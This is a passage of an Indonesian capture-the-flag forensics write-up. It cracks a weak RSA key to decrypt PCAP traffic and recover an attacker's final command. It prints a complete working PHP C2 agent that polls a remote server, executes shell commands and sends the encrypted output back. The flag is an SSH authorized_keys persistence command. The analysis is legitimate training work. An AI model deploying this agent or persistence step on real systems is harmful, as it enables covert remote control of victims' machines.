---
slug: "forensics-cms-persistence-via-custom-c2"
title: "CMS - Persistence via Custom C2"
competition: "FGTE 0"
category: "Forensics"
difficulty: "Hard"
date: "2026-03-14"
updated: "2026-07-06"
summary: "Challenge ini menunjukkan bagaimana attacker mempertahankan akses ke sistem menggunakan custom C2 agent berbasis PHP yang sederhana namun efektif. Dari proses analisis, dapat disimpulkan bahwa: Attacker menggunakan mekanisme polling C2 untuk menerima perintah secara remote. Komunikasi diamankan secara ringan menggunakan AES-128-ECB + double Base64 encoding, yang cukup untuk menghindari deteksi kasual tetapi tetap mudah di-reverse saat dianalisis. Artefak penting seperti agent.php dan agent_debug.log menjadi kunci utama dalam memahami cara kerja malware dan alur komunikasi C2. Hal paling krusial yang berhasil diungkap adalah: 👉 mekanisme persistence yang digunakan attacker, yaitu dengan menambahkan SSH public key ke dalam file authorized_keys. Ini memungkinkan attacker: Masuk kembali ke sistem kapan saja Tanpa perlu eksploitasi ulang Tanpa bergantung pada webshell atau C2 lagi"
tags: ["FORENSIC","NETWORK ANALYST","PCAP","HARD"]
status: "published"
flag: "FGTE0{echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBWOva1ZYUQ8FvZXcCu4b+VDLU0R4qVjs4sIkK4yUpdA root@ms.ariaf.my.id\" > /home/aria/.ssh/authorized_keys}"
attachments: []
source: "https://claritys.web.id/writeups/forensics-cms-persistence-via-custom-c2"
---

# CMS - Persistence via Custom C2

> Challenge ini menunjukkan bagaimana attacker mempertahankan akses ke sistem menggunakan custom C2 agent berbasis PHP yang sederhana namun efektif. Dari proses analisis, dapat disimpulkan bahwa: Attacker menggunakan mekanisme polling C2 untuk menerima perintah secara remote. Komunikasi diamankan secara ringan menggunakan AES-128-ECB + double Base64 encoding, yang cukup untuk menghindari deteksi kasual tetapi tetap mudah di-reverse saat dianalisis. Artefak penting seperti agent.php dan agent_debug.log menjadi kunci utama dalam memahami cara kerja malware dan alur komunikasi C2. Hal paling krusial yang berhasil diungkap adalah: 👉 mekanisme persistence yang digunakan attacker, yaitu dengan menambahkan SSH public key ke dalam file authorized_keys. Ini memungkinkan attacker: Masuk kembali ke sistem kapan saja Tanpa perlu eksploitasi ulang Tanpa bergantung pada webshell atau C2 lagi

## 🧠 Write-Up: C2 Agent Forensics – Recovering Final Command (3/4 slop)

### 🔎 Deskripsi Challenge

Setelah berhasil mendapatkan akses interaktif ke sistem, attacker diketahui mengdeploy sebuah custom C2 agent berbasis PHP untuk mempertahankan akses dan menjalankan perintah secara remote.

Analisis terhadap artefak C2, log komunikasi, dan file yang ditinggalkan menunjukkan adanya aktivitas yang berkaitan dengan mekanisme persistence pada sistem.

Tujuan utama adalah:  
**mengidentifikasi perintah terakhir yang dijalankan oleh attacker melalui C2 tersebut.**

Format flag:

```
FGTE0{command}
```

Hint: _cari file PHP yang diunduh (wget) dan analisis isinya._

* * *

## 🧩 Step 1 – Analisis stream

Dikarenakan ini merupakan C2, jadi kita menjadi apa yang dipost di .pcap ini. Saya memakai filter:

```

http.request.method == "POST" 
```

Output:

![](/assets/uploads/writeup-inline-f7c20b69-5700-41d5-93c2-43246b538592.png)

Saya cek stream 1550, 1552, dan 1553 itu isinya kosong. Dan saya liat isi protocolnya ada TCP dan TLS.

![](/assets/uploads/writeup-inline-beeb3841-29da-4957-b999-cb39e60d9d72.png)

Dengan referensi dari write up dari link ini, [https://wu.ariaf.my.id/docs/2026/c2c\_qual/foren/03\_React#7-what-encryption-key--password-was-used-to-interact-with-the-c2-server](https://wu.ariaf.my.id/docs/2026/c2c_qual/foren/03_React#7-what-encryption-key--password-was-used-to-interact-with-the-c2-server) saya mencoba ini dahulu. Dan ini menjadi kuat, karena website yang diakses fokus ke 1 aja. Jadi seharusnya .cer nya sama.

Setelah saya cek di '**File > Export Objects > X509AF'**

![](/assets/uploads/writeup-inline-e3db2151-912c-4e12-ad93-890f2ec0a76c.png)Ternyata tebakan saya benar. '.cer'-nya sama semua. Lalu kita pilih salah satu dan save filenya untuk kita analisis.

* * *

## 🧩 Step 2 – Analisis .cer

Kita akan coba extract / lihat informasi apa saja yang terdapat dari '.cer' ini.

```php
mv 50402de1d75ab11c1dae67478b5ef106e9e6e5c6.cer cemes.cer
openssl x509 -in cemes.cer -text
```

Output:

```php
~/FGTE/FGTE0/foren/CMS-Persiscant
❯ mv 50402de1d75ab11c1dae67478b5ef106e9e6e5c6.cer cemes.cer

~/FGTE/FGTE0/foren/CMS-Persiscant
❯ openssl x509 -in cemes.cer -text
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            50:40:2d:e1:d7:5a:b1:1c:1d:ae:67:47:8b:5e:f1:06:e9:e6:e5:c6
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=ID, ST=CTF, L=CTF, O=CustomTLS, CN=google.local
        Validity
            Not Before: Feb 24 03:49:57 2026 GMT
            Not After : Feb 24 03:49:57 2027 GMT
        Subject: C=ID, ST=CTF, L=CTF, O=CustomTLS, CN=google.local
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (1023 bit)
                Modulus:
                    5a:11:67:e9:68:04:97:2d:21:ad:e3:b3:ea:47:3f:
                    df:d0:21:08:74:1f:b2:11:b8:a9:ae:86:c5:ba:da:
                    6a:c2:b6:28:44:60:d0:9e:37:cc:d2:49:9b:3a:15:
                    fb:eb:ea:c6:56:1f:d0:46:25:6e:aa:f4:bd:fc:e0:
                    ca:4a:4f:f1:a8:25:80:01:84:99:7f:32:53:78:cc:
                    f3:9f:28:12:d5:a9:94:07:c9:2c:aa:b0:ce:9e:26:
                    4e:d8:dd:2c:e9:a4:e3:b3:3c:24:f8:fd:ee:75:53:
                    df:4b:88:cb:30:ab:3a:13:06:78:ea:b2:11:13:38:
                    db:f0:a1:d4:9d:02:fe:07
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier:
                2A:ED:34:B4:80:0D:7E:3F:4A:3D:26:A5:0A:35:98:DA:5D:A1:EE:C5
            X509v3 Authority Key Identifier:
                2A:ED:34:B4:80:0D:7E:3F:4A:3D:26:A5:0A:35:98:DA:5D:A1:EE:C5
            X509v3 Basic Constraints: critical
                CA:TRUE
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        35:ab:21:32:71:79:bc:a2:69:23:1c:24:fc:44:a0:15:c7:23:
        53:c6:3e:6b:ee:25:72:2a:24:18:b7:f3:20:0c:7d:3c:a9:3a:
        ba:9f:53:5a:51:8f:65:5e:70:ef:d6:c4:2e:25:e2:c3:5c:04:
        74:41:ed:1a:0e:8f:a9:01:e2:a7:c3:66:51:97:fc:f7:f3:96:
        bc:dd:a8:d3:9e:0c:5e:c6:90:90:17:e8:c5:d4:43:ed:96:c6:
        c2:0b:c0:e6:38:fa:7f:d3:19:6b:61:d1:1b:13:f5:0a:13:9c:
        27:07:ba:ef:49:31:1d:cf:17:45:ac:ae:8e:87:34:60:fd:ce:
        3f:cc
-----BEGIN CERTIFICATE-----
MIICgzCCAeygAwIBAgIUUEAt4ddasRwdrmdHi17xBunm5cYwDQYJKoZIhvcNAQEL
BQAwVDELMAkGA1UEBhMCSUQxDDAKBgNVBAgMA0NURjEMMAoGA1UEBwwDQ1RGMRIw
EAYDVQQKDAlDdXN0b21UTFMxFTATBgNVBAMMDGdvb2dsZS5sb2NhbDAeFw0yNjAy
MjQwMzQ5NTdaFw0yNzAyMjQwMzQ5NTdaMFQxCzAJBgNVBAYTAklEMQwwCgYDVQQI
DANDVEYxDDAKBgNVBAcMA0NURjESMBAGA1UECgwJQ3VzdG9tVExTMRUwEwYDVQQD
DAxnb29nbGUubG9jYWwwgZ4wDQYJKoZIhvcNAQEBBQADgYwAMIGIAoGAWhFn6WgE
ly0hreOz6kc/39AhCHQfshG4qa6GxbraasK2KERg0J43zNJJmzoV++vqxlYf0EYl
bqr0vfzgykpP8aglgAGEmX8yU3jM858oEtWplAfJLKqwzp4mTtjdLOmk47M8JPj9
7nVT30uIyzCrOhMGeOqyERM42/Ch1J0C/gcCAwEAAaNTMFEwHQYDVR0OBBYEFCrt
NLSADX4/Sj0mpQo1mNpdoe7FMB8GA1UdIwQYMBaAFCrtNLSADX4/Sj0mpQo1mNpd
oe7FMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADgYEANashMnF5vKJp
Ixwk/ESgFccjU8Y+a+4lciokGLfzIAx9PKk6up9TWlGPZV5w79bELiXiw1wEdEHt
Gg6PqQHip8NmUZf89/OWvN2o054MXsaQkBfoxdRD7ZbGwgvA5jj6f9MZa2HRGxP1
ChOcJwe670kxHc8XRayujoc0YP3OP8w=
-----END CERTIFICATE-----
```

Setelah saya cek outputnya, ada hal yang janggal. Yaitu: Public-Key: (1023 bit). Tidak ada RSA 1023 bit. Adanya 1024, 2048, dst. Jadi, saya asumsikan kalau ini bisa di bruteforcing priv keynya. Kita memakai RsaCtfTool.

Cara instalasi RsaCtfTool:

```php
pip install git+https://github.com/RsaCtfTool/RsaCtfTool
```

Kita ekstrak dulu public key dari '.cer' menggunakan openssl.

```php
openssl x509 -in cemes.cer -pubkey -noout > pub.pem
```

Lalu kita bisa jalankan RsaCtfToolnya:

```php
rsacrack --publickey pub.pem --private

~/FGTE/FGTE0/foren/CMS-Persiscant
.venv ❯ rsacrack --publickey pub.pem --private

[*] Testing key pub.pem.
attack initialized...
[*] Performing factordb attack on pub.pem.
[!] Composite not in factordb, couldn't factorize...
[+] Time elapsed: 1.0370 sec.
[*] Performing fibonacci_gcd attack on pub.pem.
100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 9999/9999 [00:00<00:00, 122983.49it/s]
[+] Time elapsed: 0.1024 sec.
[*] Performing lucas_gcd attack on pub.pem.
100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 9999/9999 [00:00<00:00, 128715.47it/s]
[+] Time elapsed: 0.0790 sec.
[*] Performing mersenne_primes attack on pub.pem.
 27%|████████████████████████████████████████                                                                                                          | 14/51 [00:00<00:00, 441505.68it/s]
[+] Time elapsed: 0.0006 sec.
[*] Performing nonRSA attack on pub.pem.
[+] Time elapsed: 0.0010 sec.
[*] Performing pastctfprimes attack on pub.pem.
[+] Time elapsed: 0.0004 sec.
[*] Performing rapid7primes attack on pub.pem.
[+] Time elapsed: 0.0002 sec.
[*] Performing smallq attack on pub.pem.
[+] Time elapsed: 0.2175 sec.
[*] Performing system_primes_gcd attack on pub.pem.
100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 7007/7007 [00:00<00:00, 1025560.53it/s]
[+] Time elapsed: 0.0256 sec.
[*] Performing SQUFOF attack on pub.pem.
[*] Attack success with SQUFOF method !
[+] Total time elapsed min,max,avg: 0.0002/1.0370/0.1626 sec.

Results for pub.pem:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIICWgIBAAKBgFoRZ+loBJctIa3js+pHP9/QIQh0H7IRuKmuhsW62mrCtihEYNCe
N8zSSZs6Ffvr6sZWH9BGJW6q9L384MpKT/GoJYABhJl/MlN4zPOfKBLVqZQHySyq
sM6eJk7Y3SzppOOzPCT4/e51U99LiMswqzoTBnjqshETONvwodSdAv4HAgMBAAEC
gYAsYh1pmFeCw7uv++BB14BzYxWUG90um6r6+sTxFSXirDalWyS2SPFIXmvlMVd6
AAR+XhxpPtfdVCMsqDuBk+MWpdTNl96HlDgsh30WDk2QpICWu86/IDhzDETjQfBC
U3EIuRjpFAVeVVAPuDbETbo03BtKNHgXFA5smH5H1r2kYQJBAJfYvjmD6L9QW/RP
dzytktaTtkyj7noYomSxGY5ccyq3PSa/dbAlYdXtSX+EkTUACDMzIiRXZO7lND4T
1D3y0fECQQCX2L45g+i/UFv0T3c8rZLWk7ZMo+56GKJksRmOXHMqtz0mv3WwJWHV
7Ul/hJE1AAgzMyIkV2Tu5TQ+E9Q98td3AkBQmaDnYKhTnLEirmepUq0FryRt6/oy
3w6cChF5qoMLInaYMbqjhEQ5TJnd0R1Ol7TCkJrH1Yfi8tDXPqlDNLfRAkBxZ+za
I8xGZgvnMRpKdQ//th4mqyBGi/Ns5F/D1QQmWOgQ8llBDwo8rZWA6U9RmA6Hvp63
KZY2XXRhEIopIh8NAkAcrC+BoIMIPm1VyAjvwegg6exKN5OvIlff9UQCzWIl8ETw
UtzUrZ8lreRrLdo999vkApgwgMBSCw2qrkpLbQk6
-----END RSA PRIVATE KEY-----
```

Karena kita sudah dapat Private Keynya, kita bisa menggunakannya untuk decrypt traffic TLS nya. Kita masukkan output rsactftoolsnya ke dalam file priv.pem

```php
~/FGTE/FGTE0/foren/CMS-Persiscant
.venv ❯ echo "-----BEGIN RSA PRIVATE KEY-----
        MIICWgIBAAKBgFoRZ+loBJctIa3js+pHP9/QIQh0H7IRuKmuhsW62mrCtihEYNCe
        N8zSSZs6Ffvr6sZWH9BGJW6q9L384MpKT/GoJYABhJl/MlN4zPOfKBLVqZQHySyq
        sM6eJk7Y3SzppOOzPCT4/e51U99LiMswqzoTBnjqshETONvwodSdAv4HAgMBAAEC
        gYAsYh1pmFeCw7uv++BB14BzYxWUG90um6r6+sTxFSXirDalWyS2SPFIXmvlMVd6
        AAR+XhxpPtfdVCMsqDuBk+MWpdTNl96HlDgsh30WDk2QpICWu86/IDhzDETjQfBC
        U3EIuRjpFAVeVVAPuDbETbo03BtKNHgXFA5smH5H1r2kYQJBAJfYvjmD6L9QW/RP
        dzytktaTtkyj7noYomSxGY5ccyq3PSa/dbAlYdXtSX+EkTUACDMzIiRXZO7lND4T
        1D3y0fECQQCX2L45g+i/UFv0T3c8rZLWk7ZMo+56GKJksRmOXHMqtz0mv3WwJWHV
        7Ul/hJE1AAgzMyIkV2Tu5TQ+E9Q98td3AkBQmaDnYKhTnLEirmepUq0FryRt6/oy
        3w6cChF5qoMLInaYMbqjhEQ5TJnd0R1Ol7TCkJrH1Yfi8tDXPqlDNLfRAkBxZ+za
        I8xGZgvnMRpKdQ//th4mqyBGi/Ns5F/D1QQmWOgQ8llBDwo8rZWA6U9RmA6Hvp63
        KZY2XXRhEIopIh8NAkAcrC+BoIMIPm1VyAjvwegg6exKN5OvIlff9UQCzWIl8ETw
        UtzUrZ8lreRrLdo999vkApgwgMBSCw2qrkpLbQk6
        -----END RSA PRIVATE KEY-----" > Priv.pem

~/FGTE/FGTE0/foren/CMS-Persiscant
.venv ❯ cat priv.pem
-----BEGIN RSA PRIVATE KEY-----
MIICWgIBAAKBgFoRZ+loBJctIa3js+pHP9/QIQh0H7IRuKmuhsW62mrCtihEYNCe
N8zSSZs6Ffvr6sZWH9BGJW6q9L384MpKT/GoJYABhJl/MlN4zPOfKBLVqZQHySyq
sM6eJk7Y3SzppOOzPCT4/e51U99LiMswqzoTBnjqshETONvwodSdAv4HAgMBAAEC
gYAsYh1pmFeCw7uv++BB14BzYxWUG90um6r6+sTxFSXirDalWyS2SPFIXmvlMVd6
AAR+XhxpPtfdVCMsqDuBk+MWpdTNl96HlDgsh30WDk2QpICWu86/IDhzDETjQfBC
U3EIuRjpFAVeVVAPuDbETbo03BtKNHgXFA5smH5H1r2kYQJBAJfYvjmD6L9QW/RP
dzytktaTtkyj7noYomSxGY5ccyq3PSa/dbAlYdXtSX+EkTUACDMzIiRXZO7lND4T
1D3y0fECQQCX2L45g+i/UFv0T3c8rZLWk7ZMo+56GKJksRmOXHMqtz0mv3WwJWHV
7Ul/hJE1AAgzMyIkV2Tu5TQ+E9Q98td3AkBQmaDnYKhTnLEirmepUq0FryRt6/oy
3w6cChF5qoMLInaYMbqjhEQ5TJnd0R1Ol7TCkJrH1Yfi8tDXPqlDNLfRAkBxZ+za
I8xGZgvnMRpKdQ//th4mqyBGi/Ns5F/D1QQmWOgQ8llBDwo8rZWA6U9RmA6Hvp63
KZY2XXRhEIopIh8NAkAcrC+BoIMIPm1VyAjvwegg6exKN5OvIlff9UQCzWIl8ETw
UtzUrZ8lreRrLdo999vkApgwgMBSCw2qrkpLbQk6
-----END RSA PRIVATE KEY-----
```

Sekarang kita bisa export filenya ke dalam wireshark agar bisa decrypt TLS nya. dengan cara:

1.  Edit -> Preferences (Paling bawah)
    
    ![](/assets/uploads/writeup-inline-c2b401a8-4c2d-4bdf-ada5-ce52a8d8ce14.png)
    
2.  Preferences > Protocol > TLS
    
    ![](/assets/uploads/writeup-inline-55132b70-f93a-43cf-8765-6ec4c813170f.png)
    
3.  buka "Edit" dari RSA keys list tadi dan isi IP addressnya sama dengan IP address post http tadi. Yaitu **192.168.1.12 & 192.168.1.13 (IP dari stream 1550 / http.request.method == "POST" ).** Beserta protocol http dan key filenya menurut folder di mana priv.pem kita tadi.
    
    ![](/assets/uploads/writeup-inline-198ff9fd-45be-49be-b711-6f6f254e1eee.png)
    
4.  Lalu kita pencet **OK** dan jangan lupa **Apply.**
    
    ![](/assets/uploads/writeup-inline-ec05dfca-09ea-4e3c-ab0e-3ffce20301b9.png)
    

Setelah step step tadi, kita sekarang bisa explore streamnya dengan kondisi sudah terdecrypt.

Saya cek stream 1550, ternyata dia adalah isi dari agent.php yang di download dari /agent\_source.

Isi stream:

```php
GET /agent_source HTTP/1.1
Host: 192.168.1.12
User-Agent: curl/7.64.0
Accept: */*


HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 5238
Connection: close

<?php

// daemonize automatically when executed via web
if (php_sapi_name() !== 'cli')
{
    exec("php " . __FILE__ . " > /dev/null 2>&1 &");
    exit;
}

$key = "ctfkey1234567890";
$method = "AES-128-ECB";

function encrypt_data($data, $key, $method)
{
    return base64_encode(openssl_encrypt($data, $method, $key));
}

function decrypt_data($data, $key, $method)
{
    return openssl_decrypt(base64_decode($data), $method, $key);
}

$gid = "victim1";

// disable SSL verification (IMPORTANT)
$context = stream_context_create([
    "ssl" => [
        "verify_peer" => false,
        "verify_peer_name" => false,
        "allow_self_signed" => true
    ]
]);

// get command

// run indefinitely and ignore connection aborts so daemon stays running
ignore_user_abort(true);
set_time_limit(0);

// $base_url = "https://192.168.1.65/c2.php";
$base_url = "https://192.168.1.12/c2.php";

$debug_file = __DIR__ . "/agent_debug.log";

while (true)
{
    $url = $base_url . "?gid=" . urlencode($gid) . "&classid=poll";

    $cmd_enc = @file_get_contents($url, false, $context);

    if ($cmd_enc === false)
    {
        // couldn't reach C2, wait and retry
        sleep(10);
        continue;
    }

    $cmd = decrypt_data($cmd_enc, $key, $method);

    // debug: record encrypted and decrypted command
    @file_put_contents($debug_file, date("Y-m-d H:i:s") . " - polled cmd_enc: " . trim($cmd_enc) . "\n", FILE_APPEND);
    @file_put_contents($debug_file, date("Y-m-d H:i:s") . " - decrypted cmd: " . trim((string)$cmd) . "\n", FILE_APPEND);
    @file_put_contents($debug_file, date("Y-m-d H:i:s") . " - decrypted cmd hex: " . trim(bin2hex((string)$cmd)) . "\n", FILE_APPEND);

    if (!$cmd || trim($cmd) === "")
    {
        // no command for now, poll later
        sleep(5);
        continue;
    }

    // execute command and capture output
    // try to capture which shell/binaries are available
    @file_put_contents($debug_file, date("Y-m-d H:i:s") . " - PATH: " . getenv('PATH') . "\n", FILE_APPEND);
    @file_put_contents($debug_file, date("Y-m-d H:i:s") . " - which php: " . trim((string)shell_exec('which php 2>&1')) . "\n", FILE_APPEND);

    // normalize line endings (remove CR) and prepare shell wrapper
    $cmd_clean = str_replace("\r", '', (string)$cmd);
    $cmd_clean = trim($cmd_clean);
    // put redirection outside the single-quoted script so the wrapper applies it
    $safe_cmd = '/bin/sh -c ' . escapeshellarg($cmd_clean) . ' 2>&1';
    @file_put_contents($debug_file, date("Y-m-d H:i:s") . " - exec wrapper: " . $safe_cmd . "\n", FILE_APPEND);

    $disabled = array_map('trim', explode(',', ini_get('disable_functions')));
    @file_put_contents($debug_file, date("Y-m-d H:i:s") . " - disable_functions: " . ini_get('disable_functions') . "\n", FILE_APPEND);
    @file_put_contents($debug_file, date("Y-m-d H:i:s") . " - function_exists shell_exec: " . (function_exists('shell_exec') ? 'yes' : 'no') . "\n", FILE_APPEND);
    @file_put_contents($debug_file, date("Y-m-d H:i:s") . " - function_exists exec: " . (function_exists('exec') ? 'yes' : 'no') . "\n", FILE_APPEND);
    @file_put_contents($debug_file, date("Y-m-d H:i:s") . " - function_exists system: " . (function_exists('system') ? 'yes' : 'no') . "\n", FILE_APPEND);

    $output = '';
    // try shell_exec first
    if (function_exists('shell_exec') && !in_array('shell_exec', $disabled)) {
        $out = @shell_exec($safe_cmd);
        if ($out !== null) {
            $output = $out;
            @file_put_contents($debug_file, date("Y-m-d H:i:s") . " - used shell_exec\n", FILE_APPEND);
        }
    }

    // fallback to exec
    if ($output === '' && function_exists('exec') && !in_array('exec', $disabled)) {
        $arr = array();
        @exec($safe_cmd, $arr, $rc);
        $output = implode("\n", $arr);
        @file_put_contents($debug_file, date("Y-m-d H:i:s") . " - used exec rc=" . (isset($rc)?$rc:'') . "\n", FILE_APPEND);
    }

    // fallback to system
    if ($output === '' && function_exists('system') && !in_array('system', $disabled)) {
        ob_start();
        @system($safe_cmd, $rc2);
        $output = ob_get_clean();
        @file_put_contents($debug_file, date("Y-m-d H:i:s") . " - used system rc=" . (isset($rc2)?$rc2:'') . "\n", FILE_APPEND);
    }
    if ($output === null) {
        $output = "";
    }

    @file_put_contents($debug_file, date("Y-m-d H:i:s") . " - execution output: \n" . $output . "\n", FILE_APPEND);

    $output_enc = encrypt_data($output, $key, $method);

    // send result back (ignore failures)
    $result_url = $base_url . "?gid=" . urlencode($gid) . "&classid=result&data=" . urlencode($output_enc);
    $resp = @file_get_contents($result_url, false, $context);
    @file_put_contents($debug_file, date("Y-m-d H:i:s") . " - result post url: " . $result_url . "\n", FILE_APPEND);
    @file_put_contents($debug_file, date("Y-m-d H:i:s") . " - c2 response: " . trim((string)$resp) . "\n", FILE_APPEND);

    // short randomized sleep to avoid tight loop
    sleep(5 + rand(0,5));
}

// unreachable, but keep for clarity
echo "Agent OK";

?>
```

Isi stream 1553:

```php
GET /c2.php?gid=victim1&classid=poll HTTP/1.0
Host: 192.168.1.12
Connection: close


HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 376
Connection: close

UTVNL0dSQmVJK0FUTVJQbHV4eTJicHZXOCtRbTdpUHdjUGl1TjFaTnAyWnFVdFZqYzVZL3Q5Nnd5bWxneEQ2Z2UrL3dqU3FUK1dmVkV2SGVybEVQdm9qUC9PNzFERVMxbTU2czVzc1B3a3hoTkFxcllHSlZxampxNE1uaG5ueUJIaG5tODErSTJSYnNZVERlelc5VmZHWksrRmx1ZzJDekxaNFpGaGNyb0pYWWg3Z2RQa3htSE1YT2ZZeHJMQklSTk9zc2VjdWxFdXU0SnlBVDZsTXFYK0sweEJxdUViM3UwcTdhNFJtODBkQUl2eDhndGc5dWpzUzNDZ3krV2JmeFFoYkNqM3hvUHljWSthOGV1c1hTbXc9PQ==
```

Isi stream 1554:

```php
GET /c2.php?gid=victim1&classid=result&data=OU1ybWRESGlqR1ZNRUErUW9TaytFNCtGTmUxdWZYclF0aExTR0htRnNoS0ZSbDVvcWFtWExqMUVuM29WVGF5b1FTczFRcGdnTFRmNk0xOGFmbk9XOXZ5c2FBT240VjJFRTJBQjQ2VkpwWEZVTXVSczE3R2txdGQ0THRzeStMMzJhNXNQbVQxcHN2d0FUQUc0anlOUzlmTzVWQVpEVVBxeGtTc2FWbTFRS1JTOXA3WS9sZzJQYkpjWDJTVTRlZWZUeUFyV0lIYzBQVWFxeS9zbFlKU1h2VloyQ0RsZ2pSbGJjSDBYZWlvK2JOanRSZEVTVGxVbWpaODdiRFZHd2ZHTy9GTE9nYWlSakhBbFgvSkJrbkJKRU1tbDZKcitIZEcySDZ3WFNZTGNoTEdiQkFSK0pLRlFnck1WMlhiK0tJWGx4SzJvS0lxZTNwQnMrYXVhYjZNeXFqd3ZyMFgrbkZWaS9CUzYzN0JmNmpjRnlpTURqNG52NXdTcU1PSW1MRjJNbUE1V2VET1FDQXMySmFmckcvV1pMK2ljWE1Ld0xIZnIvVngvcmVKVGNDVDhVczZCcUpHTWNDVmY4a0dTY0VrUXlhWG9tdjRkMGJZZnJCZEpndHlFc1RmWFl4STZlbnNOamVjb01GeCtNZUlETUpHb21BYTRmL3ZvTkowTWVEOEQ5M3l3aURGUkF5R21GUG1zc2F0UWxjMytRL3h4NnhrdlNtakVMa21pbklVVlhiZ0YyandLRTYvV0JHVlo4VDZZNzhZanhzVnVqUnpjQU9qRGRCL0Uyak5hTkcxdXdCbmlJK0JCR1hlcXJYakJ0RVdycDlEbUNMOTJ1cFMxSW12N3NYRVN6a0RTOVJwNXZ2bmtQcUNEZ1NJTEFraDB5emdNMFBybGg5VVZURk85OUIwUUIyKzBWbjVtWFFlL2RSY015YVhvbXY0ZDBiWWZyQmRKZ3R5RXNYR1BhNWZKYXVSSDdmdVBJVjlMTXlYY0VYRUdZK0ZpSmx6K0dDWHhoNGZ0NHM1d2lsV3RaSEpZTnE4dnRSNVJpc21sNkpyK0hkRzJINndYU1lMY2hMRTlwVGFaRWZSMXRoakxBUkpQOEUvTFltUFN1cnFhc2I3K1BheVd6cnpRTldnbllVYzNQNjd1clo4cjBycWw5aU4rK1N3MnlKL29hUXJ0cWhKQjY1YW5COUJ5NEhhd2pyOTZvVHkzODBwa3lCL0VudFFQbFJvbzZMUTdJaFN4K0ZybCtPdEpiQ1I2TWYxMG1SNlBXZE9sSDA0Z1F0WDhOeC9LM1JIREJRQTlPVzRNUnVnNEdtRW12L25kNDE5cFQySWMvbEV6UmljSERIdDB4SWpZQldIbWZwcUJMUjdaU3l0TS9wNFdXam94eitPSm8wRFpSeWhBdS9PeVQ3WERtQnNBelJyQUpkSTJmc1RzYXR4RDZhWUtJWngxcjh6SkNSdjlCM0VYNllnVFFiVGtQcENaSTlhcVN5ZlloeFJjTUh4TXYzNUtwZFJRT0tyK2hoby9XNDlnOVNpMlpnWmswTW1VQmpXMnFqb0dOVXJGVEE2cG9IajFGY2NFcWJ0UnE4bzFNdTBScFlvblVjcDVjSFZIazYrelZqUzB1ZXZTZXhqemwzZW9tRU5RcnY4a3QvNXBQd1JqclpIUjBkREtjU0ZtakYvZEdLTmRtVlcyWEdIVldqSFhrREl0Y01sTDNVVkI0QXI3THhoY1hzbWw2SnIrSGRHMkg2d1hTWUxjaExFOXBUYVpFZlIxdGhqTEFSSlA4RS9MM01KTE9zRkhmL1hDZzNVUC9JbUUxOXpabi9SdTBZaVJLU3VHclYvQkpmVkJVRGdQSDNMVmhPaXdHNHdBWDIrQTYyc1gzWlMwMllTODMvVDVXZDlFbXFnL3RoWk1MQzMzTm9nVHFmdG45WTl0cXpFZE82L0NqZzI1NEVQdi81RzNtWkw4dG1UOWdhWEM1RER0ak9xTndMTVlONEtseTVYaURRSVBRR2ZFTHdvYzlONlcvL3VCK3ZtcmVwQVJDNUJBSXhkS2w0QVJxczRiejdGL3ExZjJ5UzJWenVsUHovWDlIWWRMT29rM3ZLNkZ3b3d5UGRRdnc0cEdrWnJ1ZWJGMndkS2Z1R1Bjbmx1U2N6UVhXNHBBNWUwWHJKaGJPQmxpenp5ZGZZVlVTWXNyZnRlOC9COEdzZjN5ekpHU3FJWGpxUDBVMmZ2cVFUeURkN2NsL1k2SnhxN29pVGxKQWtYRzFUc0tneTZaWjAvYjE0M3JlUVR1SVNwYVVNWDE3UWhxejBYaW02ZXJoU1AvNit1ZmRudzB5cDE0eDF1SkExOUV0ZVpnR2haL2lmMVVoUEFlNDFmZVhiU0dPZHZTbk5GS2c5QkdSUVAxcDhvV08yVytqeDdiZTF3dzdWWGlZdU1wTWJROHVEbjNQKzE5aEZ6VlhrUVhEMlpVU0VhbkhiMWVGMStQMWNlUjJ4U3ZKOXVOa2tVcjVOTVM4LzY2bmVnMXladTgrRldZMzFxbFFvbzlxc3NLWFdUWDZqMDVSVDdKMzJzVnYzMk9qNnFpUFZRK0ZueHpoWlZmVFRhdk5vUktoczlpQm9HUVJ6SDBCUlExQW1uM1FqZWdGQ1ViMGFlVDdEQUZja0hsdTNNN3FZWVFRQ290Q2tBdmhjSDB6NEJScWZHRHBXRWljQy8rUlFlaHovWnBpci92eUJwUTAyaGZsbmpkSklnSmUxd1JGQVA0L2lCdkhxb1k0MHROcTNoVFNBMFkvdmRuSmI0UWY0alN1MVJYVUJ2eUw2am1UalpSaFJpUG90ZGMvT2JINXlYWmJ1b3l4dU9NOHFwdDNWQ21YanZFeUpqemJQK0NDOXlST3pGVUd4TWg2UEYvMlU2b3RTdXdZemZkaml3b0duTWl0NW9FdU9rV1N2NGFkSkVUYjJCa0pRcjN3Um1qZlYrNCtQdmxCSkZ0dHJaOXJQTDRTZWg1Z0M1Y0pCTjQ1Y0k0dVorUUIxNjI3S0F6ODhjRWRKZ1lhWjlHZGNGTERWSTBiZDFNbjA5TWVmcVVzamdHdXllNk5QeEU2L1FtTklaell4TVd2OTNCNTU4dkNvbksranpKNmc4STlOTEdMYkw3U1hYZGUwQ2czcnVWSys1YXFtaUVkVmQ5ZHl6cHVOSlA4V0hoU2g4eERjcHBWN1pKVEpLRWlvNUdiV3JGc3J5bTB1RkVvMEJ1ZEVHTkowa1BCY2l1SWhhT1dzbW1yRndsbGFneXJyZlRpTHN6Sk1tb2JoZnMxdHE3eVBQQjBwKzRZOXllVzVKek5CZGJpa0RsYjhhcTUxQkJFQUEwdVhBMHh5bkYyTmxJK3luYm84eFo2WHQrV2krV2QzQmZsVTJCcEhQb3A2NVhvTEhnL0lBY2FTUEpxL3o0Z1lpbmhWSm5KbElwWDdHajB3cWphRDhFTG9VMzhGQWZkUjhTellkRWVydElrWDB4eFlkTXl2M1hFbHRCUW5yV3B4dFhaN28wcWZ0eUtvWFhINFhTVWZ3Z